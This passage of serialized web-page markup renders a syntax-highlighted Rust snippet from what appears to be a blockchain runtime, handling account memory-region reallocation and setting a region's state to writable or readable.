token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\nc87:[\"$\",\"span\",\"code-segment-282\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc88:[\"$\",\"span\",\"code-segment-283\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nc89:[\"$\",\"span\",\"code-segment-284\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc8a:[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[34]}]\nc8b:[\"$\",\"span\",\"code-segment-286\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          "])</script><script>self.__next_f.push([1,"      region\"]}]\nc8c:[\"$\",\"span\",\"code-segment-287\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc8d:[\"$\",\"span\",\"code-segment-288\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}]\nc8e:[\"$\",\"span\",\"code-segment-289\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nc8f:[\"$\",\"span\",\"code-segment-290\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}]\nc90:[\"$\",\"span\",\"code-segment-291\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nc91:[\"$\",\"span\",\"code-segment-292\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nc92:[\"$\",\"span\",\"code-segment-293\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nc93:[\"$\",\"span\",\"code-segment-294\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}]\nc94:[\"$\",\"span\",\"code-segment-295\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nc95:[\"$\",\"span\",\"code-segment-296\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nc96:[\"$\",\"span\",\"code-segment-297\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc97:[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[35]}]\nc98:[\"$\",\"span\",\"code-segment-299\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nc99:[\"$\",\"span\",\"code-segment-300\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nc9a:[\"$\",\"span\",\"code-segment-301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nc9b:[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px s"])</script><script>self.__next_f.push([1,"olid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[36]}]\nc9c:[\"$\",\"span\",\"code-segment-303\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            _ \"]}]\nc9d:[\"$\",\"span\",\"code-segment-304\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\nc9e:[\"$\",\"span\",\"code-segment-305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nc9f:[\"$\",\"span\",\"code-segment-306\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nca0:[\"$\",\"span\",\"code-segment-307\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nca1:[\"$\",\"span\",\"code-segment-308\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nca2:[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[37]}]\nca3:[\"$\",\"span\",\"code-segment-310\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nca4:[\"$\",\"span\",\"code-segment-311\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nca5:[\"$\",\"span\",\"code-segment-312\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nca6:[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[38]}]\nca7:[\"$\",\"span\",\"code-segment-314\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nca8:[\"$\",\"span\",\"code-segment-315\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nca9:[\"$\",\"span\",\"code-segment-316\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncaa:[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"padd"])</script><script>self.__next_f.push([1,"ingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[39]}]\ncab:[\"$\",\"span\",\"code-segment-318\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ncac:[\"$\",\"span\",\"code-segment-319\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\ncad:[\"$\",\"span\",\"code-segment-320\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" realloc_region \"]}]\ncae:[\"$\",\"span\",\"code-segment-321\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\ncaf:[\"$\",\"span\",\"code-segment-322\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncb0:[\"$\",\"span\",\"code-segment-323\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"account_realloc_region\"]}]\ncb1:[\"$\",\"span\",\"code-segment-324\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ncb2:[\"$\",\"span\",\"code-segment-325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncb3:[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[40]}]\ncb4:[\"$\",\"span\",\"code-segment-327\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        memory_mapping\"]}]\ncb5:[\"$\",\"span\",\"code-segment-328\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ncb6:[\"$\",\"span\",\"code-segment-329\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncb7:[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[41]}]\ncb8:[\"$\",\"span\",\"code-segment-331\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\ncb9:[\"$\",\"span\""])</script><script>self.__next_f.push([1,",\"code-segment-332\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ncba:[\"$\",\"span\",\"code-segment-333\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_data_addr\"]}]\ncbb:[\"$\",\"span\",\"code-segment-334\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ncbc:[\"$\",\"span\",\"code-segment-335\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncbd:[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[42]}]\ncbe:[\"$\",\"span\",\"code-segment-337\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\ncbf:[\"$\",\"span\",\"code-segment-338\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\ncc0:[\"$\",\"span\",\"code-segment-339\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"original_data_len\"]}]\ncc1:[\"$\",\"span\",\"code-segment-340\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ncc2:[\"$\",\"span\",\"code-segment-341\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncc3:[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[43]}]\ncc4:[\"$\",\"span\",\"code-segment-343\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        is_loader_deprecated\"]}]\ncc5:[\"$\",\"span\",\"code-segment-344\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ncc6:[\"$\",\"span\",\"code-segment-345\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncc7:[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userS"])</script><script>self.__next_f.push([1,"elect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[44]}]\ncc8:[\"$\",\"span\",\"code-segment-347\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ncc9:[\"$\",\"span\",\"code-segment-348\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ncca:[\"$\",\"span\",\"code-segment-349\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\nccb:[\"$\",\"span\",\"code-segment-350\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nccc:[\"$\",\"span\",\"code-segment-351\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nccd:[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[45]}]\ncce:[\"$\",\"span\",\"code-segment-353\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nccf:[\"$\",\"span\",\"code-segment-354\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\ncd0:[\"$\",\"span\",\"code-segment-355\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncd1:[\"$\",\"span\",\"code-segment-356\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\ncd2:[\"$\",\"span\",\"code-segment-357\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncd3:[\"$\",\"span\",\"code-segment-358\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\ncd4:[\"$\",\"span\",\"code-segment-359\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ncd5:[\"$\",\"span\",\"code-segment-360\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\ncd6:[\"$\",\"span\",\"code-segment-361\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ncd7:[\"$\",\"span\",\"code-segment-362\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncd8:[\"$\",\"span\",\"code-segment-363\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\""])</script><script>self.__next_f.push([1,"=\"]}]\ncd9:[\"$\",\"span\",\"code-segment-364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" realloc_region \"]}]\ncda:[\"$\",\"span\",\"code-segment-365\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\ncdb:[\"$\",\"span\",\"code-segment-366\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncdc:[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[46]}]\ncdd:[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[47]}]\ncde:[\"$\",\"span\",\"code-segment-370\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\ncdf:[\"$\",\"span\",\"code-segment-371\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nce0:[\"$\",\"span\",\"code-segment-372\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\\n\"]}]\nce1:[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[48]}]\nce2:[\"$\",\"span\",\"code-segment-374\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nce3:[\"$\",\"span\",\"code-segment-375\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nce4:[\"$\",\"span\",\"code-segment-376\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}]\nce5:[\"$\",\"span\",\"code-segment-377\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nce6:[\"$\",\"span\",\"code-segment-378\",{\"className\":\"token token\",\"sty"])</script><script>self.__next_f.push([1,"le\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\nce7:[\"$\",\"span\",\"code-segment-379\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}]\nce8:[\"$\",\"span\",\"code-segment-380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nce9:[\"$\",\"span\",\"code-segment-381\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"can_data_be_changed\"]}]\ncea:[\"$\",\"span\",\"code-segment-382\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nceb:[\"$\",\"span\",\"code-segment-383\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ncec:[\"$\",\"span\",\"code-segment-384\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nced:[\"$\",\"span\",\"code-segment-385\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_ok\"]}]\ncee:[\"$\",\"span\",\"code-segment-386\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ncef:[\"$\",\"span\",\"code-segment-387\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ncf0:[\"$\",\"span\",\"code-segment-388\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncf1:[\"$\",\"span\",\"code-segment-389\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\ncf2:[\"$\",\"span\",\"code-segment-390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncf3:[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[49]}]\ncf4:[\"$\",\"span\",\"code-segment-392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\ncf5:[\"$\",\"span\",\"code-segment-393\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\ncf6:[\"$\",\"span\",\"code-segment-394\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\ncf7:[\"$\",\"span\",\"code-segment-395\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\""])</script><script>self.__next_f.push([1,"},\"children\":[\"Writable\"]}]\ncf8:[\"$\",\"span\",\"code-segment-396\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ncf9:[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[50]}]\ncfa:[\"$\",\"span\",\"code-segment-398\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\ncfb:[\"$\",\"span\",\"code-segment-399\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\ncfc:[\"$\",\"span\",\"code-segment-400\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncfd:[\"$\",\"span\",\"code-segment-401\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"else\"]}]\ncfe:[\"$\",\"span\",\"code-segment-402\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ncff:[\"$\",\"span\",\"code-segment-403\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nd00:[\"$\",\"span\",\"code-segment-404\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd01:[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[51]}]\nd02:[\"$\",\"span\",\"code-segment-406\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nd03:[\"$\",\"span\",\"code-segment-407\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\nd04:[\"$\",\"span\",\"code-segment-408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nd05:[\"$\",\"span\",\"code-segment-409\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}]\nd06:[\"$\",\"span\",\"code-segment-410\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd07:[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber r"])</script><script>self.__next_f.push([1,"eact-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[52]}]\nd08:[\"$\",\"span\",\"code-segment-412\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nd09:[\"$\",\"span\",\"code-segment-413\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nd0a:[\"$\",\"span\",\"code-segment-414\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd0b:[\"$\",\"span\",\"code-segment-415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nd0c:[\"$\",\"span\",\"code-segment-416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd0d:[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[53]}]\nd0e:[\"$\",\"span\",\"code-segment-418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nd0f:[\"$\",\"span\",\"code-segment-419\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nd10:[\"$\",\"span\",\"code-segment-420\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd11:[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[54]}]\nd12:[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[55]}]\nd13:[\"$\",\"span\",\"code-segment-424\",{\"className\":"])</script><script>self.__next_f.push([1,"\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nd14:[\"$\",\"span\",\"code-segment-425\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\nd15:[\"$\",\"span\",\"code-segment-426\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd16:[\"$\",\"span\",\"code-segment-427\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd17:[\"$\",\"span\",\"code-segment-428\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd18:[\"$\",\"span\",\"code-segment-429\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd19:[\"$\",\"span\",\"code-segment-430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd1a:[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[56]}]\nd1b:[\"$\",\"span\",\"code-segment-432\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nd1c:[\"$\",\"span\",\"code-segment-433\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nd1d:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\nd1e:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nd1f:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nd20:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nd21:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nd22:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\nd23:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd24:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd25:[\"$\",\"span\",\"code-segment-34\","])</script><script>self.__next_f.push([1,"{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd26:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\nd27:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nd28:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd29:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nd2a:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd2b:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nd2c:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nd2d:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \\n\"]}]\nd2e:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\nd2f:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid 